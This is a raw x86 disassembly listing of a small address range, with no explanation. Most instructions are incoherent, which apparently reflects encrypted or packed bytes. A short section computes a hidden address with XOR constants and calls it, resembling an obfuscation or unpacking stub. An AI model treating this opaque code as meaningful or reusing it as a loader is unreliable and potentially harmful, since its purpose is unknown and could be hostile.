  40dadb:	fimul  WORD PTR [edi+0x56105571]
  40dae1:	jnp    0x40db1e
  40dae3:	jb     0x40dad1
  40dae5:	jnp    0x40db1b
  40dae7:	mov    ebx,0x7e91e1ac
  40daec:	pop    ecx
  40daed:	das    
  40daee:	test   al,dl
  40daf0:	pop    esp
  40daf1:	daa    
  40daf2:	aas    
  40daf3:	std    
  40daf4:	adc    eax,0x4fcd1769
  40daf9:	(bad)  
  40dafa:	mov    esp,0x20c567aa
  40daff:	inc    esp
  40db00:	and    eax,0xe962c72
  40db05:	mov    esp,DWORD PTR ds:0xf1ff2f3d
  40db0b:	sbb    cl,BYTE PTR [esi]
  40db0d:	inc    edx
  40db0e:	and    eax,0x7f423b95
  40db13:	outs   dx,BYTE PTR ds:[esi]
  40db14:	cwde   
  40db15:	sub    eax,0xa103a966
  40db1a:	(bad)  
  40db1b:	aad    0x70
  40db1d:	inc    ebp
  40db1e:	or     al,0xff
  40db20:	pop    esi
  40db21:	mov    bh,0x6d
  40db23:	leave  
  40db24:	int3   
  40db25:	mov    edi,0x60f46258
  40db2a:	out    0xc4,al
  40db2c:	sub    DWORD PTR [ebp+ecx*4-0x4d6fe525],0x81f614dd
  40db37:	xchg   esi,eax
  40db38:	xor    al,0x9d
  40db3a:	adc    edx,DWORD PTR ds:0xa8a71903
  40db40:	push   es
  40db41:	int3   
  40db42:	add    al,0xed
  40db45:	sbb    ebp,edx
  40db47:	inc    edx
  40db48:	add    dh,BYTE PTR [ecx-0x3b]
  40db4b:	add    ch,dl
  40db4d:	mov    edx,0x9df9c1e3
  40db52:	dec    esp
  40db53:	xlat   BYTE PTR ds:[ebx]
  40db54:	dec    esp
  40db55:	out    0x4e,eax
  40db57:	mov    ebp,0xe57bf80f
  40db5c:	out    dx,al
  40db5d:	dec    ebx
  40db5e:	stos   BYTE PTR es:[edi],al
  40db5f:	les    edx,FWORD PTR [ebx]
  40db61:	dec    esi
  40db62:	mov    eax,0x3cb6e729
  40db67:	sbb    BYTE PTR [edi+0x3e],al
  40db6a:	clc    
  40db6b:	fcomp  DWORD PTR [ecx]
  40db6d:	aas    
  40db6e:	adc    DWORD PTR [eax+0x65],edi
  40db71:	cdq    
  40db72:	push   ebp
  40db73:	dec    esp
  40db74:	dec    ebx
  40db75:	sub    ah,0xd0
  40db78:	(bad)  
  40db79:	xlat   BYTE PTR ds:[ebx]
  40db7a:	leave  
  40db7b:	dec    ecx
  40db7c:	dec    edx
  40db7d:	pop    ss
  40db7e:	leave  
  40db7f:	(bad)  
  40db80:	xchg   ecx,eax
  40db81:	sub    eax,0xab423850
  40db86:	fs test al,0x3e
  40db89:	push   eax
  40db8a:	loope  0x40db32
  40db8c:	clc    
  40db8d:	fs pop ds
  40db8f:	jnp    0x40db8a
  40db91:	imul   edi,DWORD PTR [ebx-0x3],0x7e8b2119
  40db98:	cmp    al,0x1f
  40db9a:	push   ebx
  40db9b:	xor    al,0x5b
  40db9d:	push   es
  40db9e:	icebp  
  40db9f:	mov    cs:0x38da1477,eax
  40dba5:	cmp    BYTE PTR [esi],ch
  40dba7:	sbb    ebp,edx
  40dba9:	push   edi
  40dbaa:	repnz mov bl,0xf6
  40dbad:	mov    fs,edx
  40dbaf:	loopne 0x40db8f
  40dbb1:	pusha  
  40dbb2:	scas   eax,DWORD PTR es:[edi]
  40dbb3:	push   edi
  40dbb4:	out    0xff,al
  40dbb6:	pop    ebp
  40dbb7:	ret    
  40dbb8:	pop    ebx
  40dbb9:	out    dx,al
  40dbba:	pusha  
  40dbbb:	push   ebx
  40dbbc:	mov    dh,0x9e
  40dbbe:	sub    eax,0x81ba479
  40dbc3:	cmp    dl,BYTE PTR [ecx]
  40dbc5:	pop    edx
  40dbc6:	xchg   esp,eax
  40dbc7:	and    edx,DWORD PTR [ebp+ebp*2-0x72158961]
  40dbce:	ds data16 jnp 0x40dc14
  40dbd2:	jp     0x40db83
  40dbd4:	dec    esp
  40dbd5:	pop    ecx
  40dbd6:	test   al,0x54
  40dbd8:	jns    0x40dc19
  40dbda:	ds mov eax,0xd84298b3
  40dbe0:	mov    esi,0x911b86aa
  40dbe5:	sub    dl,BYTE PTR [ebx+ecx*8-0xa]
  40dbe9:	es mov esp,0x2b50d781
  40dbef:	les    edi,FWORD PTR [ebp-0x10]
  40dbf2:	daa    
  40dbf3:	mov    fs,ecx
  40dbf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbf6:	cmp    BYTE PTR [ebx-0x6c149629],ch
  40dbfc:	mov    ebp,0xb770fe2d
  40dc01:	push   esi
  40dc02:	cmp    BYTE PTR [ebp-0x6f],bl
  40dc05:	add    DWORD PTR [ebx+0x43fe499c],edx
  40dc0b:	mov    BYTE PTR [edi],al
  40dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0e:	fs cs inc ebx
  40dc11:	inc    eax
  40dc12:	inc    eax
  40dc13:	(bad)  
  40dc14:	call   0x4d640738
  40dc19:	imul   edi,DWORD PTR [edx],0x8d297b72
  40dc1f:	or     al,0x42
  40dc21:	stos   BYTE PTR es:[edi],al
  40dc22:	or     DWORD PTR [esi+0x6fea500b],edi
  40dc28:	loope  0x40dc2e
  40dc2a:	js     0x40dc6c
  40dc2c:	sub    DWORD PTR [ecx+0x4774a1b7],edx
  40dc32:	imul   ebp,esp,0xffffffdc
  40dc35:	xor    eax,0x2c1c8cbc
  40dc3a:	jno    0x40dbc4
  40dc3c:	fsub   DWORD PTR [ebx-0x46]
  40dc3f:	jecxz  0x40dc05
  40dc41:	and    edi,DWORD PTR [eax+0x6b81db72]
  40dc47:	sub    edi,DWORD PTR [eax+0x7]
  40dc4a:	dec    edi
  40dc4b:	ret    0x347b
  40dc4e:	leave  
  40dc4f:	ds das 
  40dc51:	int3   
  40dc52:	and    BYTE PTR [edx+eiz*2],ch
  40dc55:	mov    ds:0x4fdf25fb,eax
  40dc5a:	or     BYTE PTR [ebx],bh
  40dc5c:	(bad)
  40dc5f:	ret    0xa368
  40dc62:	xchg   edi,eax
  40dc63:	outs   dx,DWORD PTR ds:[esi]
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x4e5a3768]
  40dc7d:	inc    esi
  40dc7e:	push   ecx
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc98
  40dc88:	loopne 0x40dc97
  40dc8a:	push   ecx
  40dc8b:	in     eax,0xf4
  40dc8d:	and    dl,ch
  40dc8f:	out    0x48,al
  40dc91:	dec    esp
  40dc92:	pop    es
  40dc93:	punpckldq mm3,mm6
  40dc96:	and    eax,0x161f901e
  40dc9b:	stos   BYTE PTR es:[edi],al
  40dc9c:	shr    DWORD PTR [ebx],1
  40dc9e:	jno    0x40dcc9
  40dca0:	(bad)  
  40dca1:	lods   eax,DWORD PTR ds:[esi]
  40dca2:	fs inc edx
  40dca4:	push   0x724937ea
  40dca9:	mov    ebx,0x3a793a70
  40dcae:	not    bl
  40dcb0:	mov    WORD PTR [ecx-0x136188fb],es
  40dcb6:	jae    0x40dcc9
  40dcb8:	pop    ebp
  40dcb9:	mov    DWORD PTR ds:0xbcd61826,eax
  40dcbf:	test   DWORD PTR es:[ebx+0x3e],edx
  40dcc3:	sbb    al,0x2d
  40dcc5:	in     al,dx
  40dcc6:	sahf   
  40dcc7:	push   ebx
  40dcc8:	push   eax
  40dcc9:	jnp    0x40dcb1
  40dccb:	cwde   
  40dccc:	mov    ch,ch
  40dcce:	mul    BYTE PTR [ebx-0x682f684e]
  40dcd4:	mov    BYTE PTR [ebx],ah
  40dcd6:	in     eax,dx
  40dcd7:	mov    edx,DWORD PTR [edx]
  40dcd9:	nop
  40dcda:	push   edx
  40dcdb:	inc    edi
  40dcdc:	xlat   BYTE PTR ds:[ebx]
  40dcdd:	es in  eax,dx
  40dcdf:	(bad)  
  40dce2:	retf   0xcbf2
  40dce5:	shl    DWORD PTR ds:0xf23fcb04,1
  40dceb:	inc    ebx
  40dcec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dced:	js     0x40dd60
  40dcef:	pop    ss
  40dcf0:	out    dx,al
  40dcf1:	push   edi
  40dcf2:	add    BYTE PTR [bx+di-0xa],bl
  40dcf6:	cmp    BYTE PTR [ecx-0x74],0x3a
  40dcfa:	dec    ecx
  40dcfb:	mov    ah,0x2e
  40dcfd:	mov    WORD PTR [edx],gs
  40dcff:	inc    edi
  40dd00:	jle    0x40dd37
  40dd02:	sbb    DWORD PTR [eax],esi
  40dd04:	rcl    BYTE PTR [edi],0xb4
  40dd07:	mov    bl,BYTE PTR [ebx+0x3c]
  40dd0a:	pop    esp
  40dd0b:	sti    
  40dd0c:	int    0xd4
  40dd0e:	out    dx,eax
  40dd0f:	xlat   BYTE PTR ds:[ebx]
  40dd10:	inc    esp
  40dd11:	rcl    ch,1
  40dd13:	jecxz  0x40dcc3
  40dd15:	add    eax,0x1e9cb2f0
  40dd1a:	je     0x40dd40
  40dd1c:	sub    DWORD PTR [ecx+eiz*4-0x51],esp
  40dd20:	dec    edi
  40dd21:	out    dx,al
  40dd22:	js     0x40dd3b
  40dd24:	es test al,0x88
  40dd27:	or     al,0x1e
  40dd29:	loop   0x40dda1
  40dd2b:	xchg   ecx,eax
  40dd2c:	in     al,0x88
  40dd2e:	cs push ecx
  40dd30:	adc    BYTE PTR [edi-0x24dd5231],bl
  40dd36:	push   edi
  40dd37:	dec    eax
  40dd38:	ret    
  40dd39:	sti    
  40dd3a:	mov    dl,0xd2
  40dd3c:	dec    eax
  40dd3d:	bound  esi,QWORD PTR es:[ebp+0x37]
  40dd41:	retf   
  40dd42:	std    
  40dd43:	xor    al,0x28
  40dd45:	add    al,0x70
  40dd47:	cmp    ah,BYTE PTR ds:0x535338ba
  40dd4d:	mov    cl,0xab
  40dd4f:	or     al,BYTE PTR [edx+0x66]
  40dd52:	imul   dh
  40dd54:	test   al,0xcb
  40dd56:	mov    eax,ds:0x6382fac2
  40dd5b:	mov    dl,0xc5
  40dd5d:	faddp  st(5),st
  40dd5f:	lods   al,BYTE PTR ds:[esi]
  40dd60:	pop    esi
  40dd61:	cmp    ch,BYTE PTR [edi+0x74]
  40dd64:	push   esi
  40dd65:	inc    edx
  40dd66:	xor    bl,BYTE PTR [esi-0x768bb760]
  40dd6c:	jp     0x40dda5
  40dd6e:	shl    DWORD PTR [ecx-0x7d],1
  40dd71:	add    ebp,DWORD PTR [ebx+0x27]
  40dd74:	xchg   esp,eax
  40dd75:	imul   DWORD PTR [edi+0x30]
  40dd78:	mov    edi,0x22f4b3f8
  40dd7d:	adc    bl,ah
  40dd7f:	xor    eax,0x8b6f918e
  40dd84:	daa    
  40dd85:	xchg   ebp,eax
  40dd86:	xlat   BYTE PTR ds:[ebx]
  40dd87:	xchg   esi,eax
  40dd88:	test   BYTE PTR [ecx-0x4e798ed2],ch
  40dd8e:	fistp  QWORD PTR [edi+ebx*8+0x6e]
  40dd92:	sub    eax,0xf85cc9e4
  40dd97:	push   0x7
  40dd99:	pmaxub mm6,QWORD PTR [esi]
  40dd9c:	or     al,0xc0
  40dd9f:	add    BYTE PTR [ecx],dh
  40dda1:	dec    edx
  40dda2:	mov    eax,ds:0x687c9820
  40dda7:	cmc    
  40dda8:	ret    
  40dda9:	sbb    BYTE PTR [ebx+0x15],ah
  40ddac:	cmp    bl,al
  40ddae:	das    
  40ddaf:	out    dx,eax
  40ddb0:	xor    bl,BYTE PTR [eax+0x41]
  40ddb3:	jg     0x40dd87
  40ddb5:	pop    es
  40ddb6:	pop    eax
  40ddb7:	fimul  WORD PTR [edi+0x69f8358b]
  40ddbd:	adc    al,0xf4
  40ddbf:	jmp    0x40dd99
  40ddc1:	mov    dh,0xb0
  40ddc3:	jne    0x40dde8
  40ddc5:	mov    eax,ds:0xfcff7b9b
  40ddca:	or     esp,DWORD PTR [ecx-0x5c5021fd]
  40ddd0:	sub    eax,0xe285140f
  40ddd5:	ins    DWORD PTR es:[edi],dx
  40ddd6:	cli    
  40ddd7:	stc    
  40ddd8:	lods   al,BYTE PTR ds:[esi]
  40ddd9:	retf   0x333
  40dddc:	dec    esi
  40dddd:	mov    bh,0xfb
  40dddf:	mov    ebx,0xd1ae9776
  40dde4:	js     0x40ddf8
  40dde6:	push   esi
  40dde7:	fnsave [edx-0x6c]
  40ddea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddeb:	jmp    0xa1ba:0xb69f7095
  40ddf2:	rcr    DWORD PTR [eax-0x432b2617],cl
  40ddf8:	fisttp QWORD PTR ds:0x2d605f4f
  40ddfe:	cmp    DWORD PTR [eax+eiz*1+0x75133f9c],0xbf5cbb6e
  40de09:	iret   
  40de0a:	jmp    0xa119c6ab
  40de0f:	jae    0x40de2e
  40de11:	dec    eax
  40de12:	jae    0x40de4c
  40de14:	adc    edx,DWORD PTR [esi+0x36]
  40de17:	out    dx,eax
  40de18:	sbb    ebx,DWORD PTR [ecx]
  40de1a:	in     al,dx
  40de1b:	mov    ds:0x8b39efd4,al
  40de20:	sbb    eax,0x214cbe49
  40de25:	mov    bh,0xe
  40de27:	popf   
  40de28:	cmp    eax,0x225c8cae
  40de2d:	jbe    0x40de92
  40de2f:	mov    esp,DWORD PTR [ecx-0x7f]
  40de32:	loopne 0x40ddd8
  40de34:	xor    DWORD PTR [ebp+0x6611a11],0xffffffca
  40de3b:	stc    
  40de3c:	call   0x3c0749fd
  40de41:	mov    al,ds:0x48ac83b2
  40de46:	or     eax,DWORD PTR [ecx]
  40de48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de4a:	daa    
  40de4b:	jnp    0x40ddfd
  40de4d:	inc    edx
  40de4e:	dec    ebp
  40de4f:	and    eax,0x98a557ca
  40de54:	cli    
  40de55:	loop   0x40dde7
  40de57:	hlt    
  40de58:	in     eax,dx
  40de59:	call   0xa9cf98b4
  40de5e:	pop    ebx
  40de5f:	sub    BYTE PTR [ebx+0x2d],al
  40de62:	jecxz  0x40de93
  40de64:	ins    DWORD PTR es:[edi],dx
  40de65:	bnd ret 
  40de67:	es stos BYTE PTR es:[edi],al
  40de69:	lahf   
  40de6a:	mov    DWORD PTR [ebx+0x43],0xd2a8b14c
  40de71:	cmp    DWORD PTR [edi],0x2c0fc0f4
  40de77:	mov    eax,ds:0x7a5d03b1
  40de7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de7d:	dec    edx
  40de7e:	dec    ebp
  40de7f:	mov    bl,0x6a
  40de81:	sub    DWORD PTR [eax+0x39],eax
  40de84:	adc    esp,DWORD PTR [edi]
  40de86:	scas   eax,DWORD PTR es:[edi]
  40de87:	add    BYTE PTR [edx+0x572d5d7d],ah
  40de8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de8e:	xlat   BYTE PTR ds:[ebx]
  40de8f:	push   esp
  40de90:	adc    edi,DWORD PTR [ebx]
  40de92:	retf   0x30c7
  40de95:	js     0x40de5a
  40de97:	dec    ebp
  40de98:	je     0x40ded7
  40de9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de9b:	xchg   ebx,eax
  40de9c:	push   esp
  40de9d:	xchg   ebx,eax
  40de9e:	scas   al,BYTE PTR es:[edi]
  40de9f:	mov    ebp,0xf661cee7
  40dea4:	fwait
  40dea5:	cld    
  40dea6:	fidivr WORD PTR [eax+0x7d6c6746]
  40deac:	shl    BYTE PTR [ecx+edx*1+0x36],0xc4
  40deb1:	arpl   WORD PTR [eax+esi*4],di
  40deb4:	dec    esi
  40deb5:	scas   al,BYTE PTR es:[edi]
  40deb6:	sar    BYTE PTR [edi+edx*1+0x2da961c0],0x9e
  40debe:	xor    bh,cl
  40dec0:	pop    ebx
  40dec1:	ss mov eax,edx
  40dec4:	push   cs
  40dec5:	add    ecx,ecx
  40dec7:	mov    al,ds:0xe374180c
  40decc:	sub    DWORD PTR [edi],0x4185271f
  40ded2:	sub    DWORD PTR [edi],ebp
  40ded4:	imul   ebp,DWORD PTR [ecx+eiz*2-0x15d7728a],0xffffffef
  40dedc:	mov    BYTE PTR [eax],bl
  40dede:	fucomp st(3)
  40dee0:	test   DWORD PTR [ecx+0x27],ebx
  40dee3:	and    ecx,DWORD PTR [esi]
  40dee5:	mov    ah,cl
  40dee7:	ja     0x40de78
  40dee9:	call   0x274b:0xb6cfe440
  40def0:	nop
  40def1:	dec    ebp
  40def2:	xchg   ebx,eax
  40def3:	mov    dl,0xf
  40def5:	pop    ebp
  40def6:	mov    eax,0xc2a2c2a8
  40defb:	mov    ah,BYTE PTR [esp+edx*2]
  40defe:	test   eax,0x4a33e867
  40df03:	cmp    edx,edx
  40df05:	fldenv [ebx+0x39f7d7b8]
  40df0b:	push   edi
  40df0c:	dec    edi
  40df0d:	(bad)  
  40df0e:	rcl    DWORD PTR [edx-0x22],0x68
  40df12:	pop    ss
  40df13:	dec    DWORD PTR [esi]
  40df15:	inc    edx
  40df16:	int3   
  40df17:	mov    ds,eax
  40df19:	pop    esp
  40df1a:	aam    0xd1
  40df1c:	ins    BYTE PTR es:[edi],dx
  40df1d:	outs   dx,BYTE PTR ds:[esi]
  40df1e:	dec    eax
  40df1f:	arpl   WORD PTR [esi+esi*4-0x7ed3c2c1],dx
  40df26:	neg    DWORD PTR [ebp-0x18ef3a02]
  40df2c:	ds xchg edi,eax
  40df2e:	add    al,0x1a
  40df30:	sbb    DWORD PTR [ebp+ecx*2+0x3038c94],edx
  40df37:	test   eax,0x9bc53a0d
  40df3c:	and    ch,0xf6
  40df3f:	ins    BYTE PTR es:[edi],dx
  40df40:	(bad)  
  40df41:	ja     0x40df12
  40df43:	push   ebp
  40df44:	lahf   
  40df45:	xor    BYTE PTR [ecx-0x40],ah
  40df48:	outs   dx,DWORD PTR ds:[esi]
  40df49:	sti    
  40df4a:	push   es
  40df4b:	loopne 0x40df0e
  40df4d:	cmp    eax,0xbfc39887
  40df52:	lock sbb BYTE PTR [ebx+0x5172c805],0x42
  40df5a:	or     eax,0x9a282cbd
  40df5f:	mov    cl,0xdd
  40df61:	or     eax,DWORD PTR [esp+ebp*2+0x4c]
  40df65:	dec    ebx
  40df66:	adc    ch,dl
  40df68:	pusha  
  40df69:	mov    es,WORD PTR [edx]
  40df6b:	icebp  
  40df6c:	cmp    edi,DWORD PTR [ecx+ecx*4+0x73]
  40df70:	(bad)  
  40df72:	mov    cs,WORD PTR [ebx+ebp*4]
  40df75:	add    DWORD PTR [edi],eax
  40df77:	cmp    dl,BYTE PTR [edi-0x1c]
  40df7a:	clc    
  40df7b:	pop    esi
  40df7c:	inc    esp
  40df7d:	xchg   edi,eax
  40df7e:	dec    edi
  40df7f:	mov    eax,eax
  40df81:	loope  0x40dfc2
  40df83:	loope  0x40dfcd
  40df85:	adc    esp,DWORD PTR [esi]
  40df87:	inc    eax
  40df88:	fisttp QWORD PTR [ecx+0x458b9704]
  40df8f:	call   0x3349351f
  40df94:	ror    DWORD PTR [ebp+0x729b1084],0x32
  40df9b:	add    BYTE PTR [ecx+0x458b0845],cl
  40dfa1:	call   0x33553531
  40dfa6:	rol    DWORD PTR [ebx],0xc6
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs (bad) 
  40e025:	das    
  40e026:	aas    
  40e027:	std    
  40e028:	xor    BYTE PTR [ecx+0x7d7d7e7e],bl
  40e02e:	jle    0x40e0ae
  40e030:	inc    edx
  40e031:	jl     0x40e034
  40e033:	mov    ah,0x7c
  40e035:	test   dl,dl
  40e037:	sub    edx,DWORD PTR [eax+eax*4]
  40e03a:	daa    
  40e03b:	dec    edx
  40e03c:	xor    al,0xb0
  40e03e:	pop    edi
  40e03f:	mov    cl,0xfc
  40e041:	in     eax,0x10
  40e043:	or     cl,dh
  40e045:	pop    eax
  40e046:	cli    
  40e047:	fmul   QWORD PTR [esi-0x1e]
  40e04a:	out    0xc0,eax
  40e04c:	mov    bl,0xc0
  40e04e:	xor    al,0x12
  40e050:	xchg   esi,eax
  40e051:	test   BYTE PTR [ecx+0x77],bh
  40e054:	mov    dh,0xb9
  40e056:	sbb    BYTE PTR [ebp+0x46],al
  40e059:	int3   
  40e05a:	sahf   
  40e05b:	and    ebp,DWORD PTR [ecx+0x4c]
  40e05e:	dec    ebx
  40e05f:	jmp    0x9b7487e3
  40e064:	mov    esp,eax
  40e066:	xchg   ecx,eax
  40e067:	and    cl,BYTE PTR [eax+eax*2+0x7a]
  40e06b:	jmp    0x1bf34bd3
  40e070:	jns    0x40e039
  40e072:	rol    BYTE PTR [edi-0x4f2b770f],cl
  40e078:	das    
  40e079:	lds    ebx,FWORD PTR [di-0x751]
  40e07e:	dec    esi
  40e07f:	xlat   BYTE PTR ds:[ebx]
  40e080:	sbb    esi,ebx
  40e082:	icebp  
  40e083:	pop    eax
  40e084:	nop
  40e085:	sbb    eax,0xd94cad5e
  40e08a:	iret   
  40e08b:	xchg   ebx,eax
  40e08c:	shr    DWORD PTR [ecx-0x452d0c45],0x4f
  40e093:	repz in eax,dx
  40e095:	jb     0x40e0f4
  40e097:	jmp    FWORD PTR [edx-0x29]
  40e09a:	pop    edx
  40e09b:	mov    eax,DWORD PTR [edx]
  40e09d:	les    esp,FWORD PTR [esi]
  40e09f:	adc    esi,DWORD PTR [ecx-0x5c]
  40e0a2:	lods   al,BYTE PTR ds:[esi]
  40e0a3:	jmp    0x40e09d
  40e0a5:	and    bl,bh
  40e0a7:	xor    BYTE PTR [ebp+edi*8+0x13],ch
  40e0ab:	call   0xe3426681
  40e0b0:	cld    
  40e0b1:	in     al,dx
  40e0b2:	xchg   edx,eax
  40e0b3:	stc    
  40e0b4:	rcr    DWORD PTR [eax-0x60],1
  40e0b7:	(bad)  
  40e0b8:	ret    0x544a
  40e0bb:	jb     0x40e117
  40e0bd:	mov    BYTE PTR [ecx],ch
  40e0bf:	push   eax
  40e0c0:	jne    0x40e0a1
  40e0c2:	scas   al,BYTE PTR es:[edi]
  40e0c3:	gs push 0x88e6dd47
  40e0c9:	xor    esp,DWORD PTR [esi-0x4939c3f7]
  40e0cf:	je     0x40e095
  40e0d1:	adc    dl,dh
  40e0d3:	aas    
  40e0d4:	push   esp
  40e0d5:	mov    ah,0x6b
  40e0d7:	imul   ecx,DWORD PTR [edi-0x1fbb0546],0x9bb8132f
  40e0e1:	cmp    BYTE PTR [edi+0x68],cl
  40e0e4:	pop    edi
  40e0e5:	mov    edi,ecx
  40e0e7:	sbb    ebx,edi
  40e0e9:	mov    ecx,0x8779425e
  40e0ee:	jbe    0x40e076
  40e0f0:	int3   
  40e0f1:	ficom  WORD PTR [eax+0x4e]
  40e0f4:	mov    cl,0xd3
  40e0f6:	cmp    cl,ah
  40e0f8:	rep lods eax,DWORD PTR ds:[si]
  40e0fb:	mov    esi,0x2708b9d9
  40e100:	popa   
  40e101:	test   eax,0x63af4893
  40e106:	(bad)  
  40e108:	lock mov fs,WORD PTR [ebx+0x3e6df5cc]
  40e10f:	clc    
  40e110:	gs (bad) 
  40e112:	cmc    
  40e113:	mov    ds:0xc1120acb,al
  40e118:	xor    eax,0xc94a877f
  40e11d:	add    eax,0x292a8048
  40e122:	mov    dh,bl
  40e124:	jno    0x40e196
  40e126:	in     al,dx
  40e127:	dec    edx
  40e128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e129:	push   ecx
  40e12a:	imul   esp,edx,0x4e
  40e12d:	and    DWORD PTR ds:0x56451374,ebp
  40e133:	pusha  
  40e134:	push   0x3a
  40e136:	pop    edx
  40e137:	pusha  
  40e138:	shr    BYTE PTR [edx+0x64a5239f],0x64
  40e13f:	cli    
  40e140:	neg    BYTE PTR [eax]
  40e142:	pop    edi
  40e143:	jbe    0x40e179
  40e145:	shl    BYTE PTR [ebp-0x59],cl
  40e148:	and    eax,0x8157cf00
  40e14d:	mov    ?,WORD PTR [esi+0x4e18ca17]
  40e153:	jl     0x40e170
  40e155:	loop   0x40e11d
  40e157:	jecxz  0x40e1c3
  40e159:	jae    0x40e155
  40e15b:	dec    esi
  40e15c:	mov    ds:0xb26f138e,eax
  40e161:	xchg   esi,eax
  40e162:	pop    esi
  40e163:	aad    0x1b
  40e165:	add    BYTE PTR [edx],0x40
  40e168:	lds    esi,FWORD PTR [ecx]
  40e16a:	cs lock add cl,bh
  40e16e:	fsubr  DWORD PTR [edi+eiz*8-0x67]
  40e172:	scas   eax,DWORD PTR es:[edi]
  40e173:	daa    
  40e174:	inc    ebx
  40e175:	adc    edi,DWORD PTR [eax]
  40e177:	stos   BYTE PTR es:[edi],al
  40e178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e179:	mov    dh,0x3
  40e17b:	mul    DWORD PTR [ebx-0x54]
  40e17e:	mov    ds:0xf2820a9b,eax
  40e183:	pop    ebp
  40e184:	outs   dx,DWORD PTR ds:[esi]
  40e185:	(bad)  
  40e186:	cdq    
  40e187:	push   ebx
  40e188:	pop    eax
  40e189:	in     eax,dx
  40e18a:	add    eax,0x1e829c33
  40e18f:	mov    DWORD PTR [esi-0x77df75b0],eax
  40e195:	lock push ebx
  40e197:	or     al,0x6c
  40e199:	or     DWORD PTR [edx+esi*1+0x5e],0xffffffc6
  40e19e:	and    al,0xa7
  40e1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a1:	fadd   st(3),st
  40e1a3:	dec    edi
  40e1a4:	sahf   
  40e1a5:	push   ecx
  40e1a6:	add    BYTE PTR [edi+edi*4-0x54],al
  40e1aa:	xchg   esp,eax
  40e1ab:	stc    
  40e1ac:	push   0xffffffd4
  40e1ae:	cwde   
  40e1af:	mov    esi,0xe87591a1
  40e1b4:	adc    eax,0xf87f94c7
  40e1b9:	in     al,dx
  40e1ba:	and    edi,DWORD PTR [ebp-0x760945f4]
  40e1c0:	mov    ?,WORD PTR [ecx+0xe]
  40e1c3:	mov    al,0x23
  40e1c5:	push   ebp
  40e1c6:	mov    esp,DWORD PTR [ecx+0x2e]
  40e1c9:	jb     0x40e16a
  40e1cb:	(bad)  
  40e1cc:	mov    dh,0xed
  40e1ce:	push   edi
  40e1cf:	add    BYTE PTR [ebx-0x4ae20e2f],bl
  40e1d5:	mov    bl,BYTE PTR [ebx+0x2]
  40e1d8:	push   ecx
  40e1d9:	stos   BYTE PTR es:[edi],al
  40e1da:	aas    
  40e1db:	ds (bad) 
  40e1dd:	shl    bh,1
  40e1df:	dec    edx
  40e1e0:	arpl   WORD PTR [edx-0x461b152],cx
  40e1e6:	fidiv  DWORD PTR [eax]
  40e1e8:	aam    0x1f
  40e1ea:	addr16 fwait
  40e1ec:	outs   dx,BYTE PTR ds:[esi]
  40e1ed:	xor    bl,bh
  40e1ef:	xchg   esi,eax
  40e1f0:	or     edi,DWORD PTR [eax]
  40e1f2:	pop    ebp
  40e1f3:	or     DWORD PTR [edi],eax
  40e1f5:	test   bl,al
  40e1f7:	lods   al,BYTE PTR ds:[esi]
  40e1f8:	mov    eax,0x26e42234
  40e1fd:	pop    edx
  40e1fe:	cli    
  40e1ff:	inc    ebx
  40e200:	sbb    DWORD PTR gs:[edx-0x55],esp
  40e204:	sub    DWORD PTR [ebx+ecx*2],ebp
  40e207:	dec    esi
  40e208:	mov    ah,0xbb
  40e20a:	jg     0x40e215
  40e20c:	sub    al,0xd2
  40e20e:	cmp    al,0xe8
  40e210:	clc    
  40e211:	jmp    0x40e1e7
  40e213:	mov    ds:0xa10e6e6c,al
  40e218:	call   0x1bcc:0x380419cd
  40e21f:	and    eax,0xdc7a75cf
  40e224:	xchg   ebp,eax
  40e225:	adc    edi,edx
  40e227:	push   ds
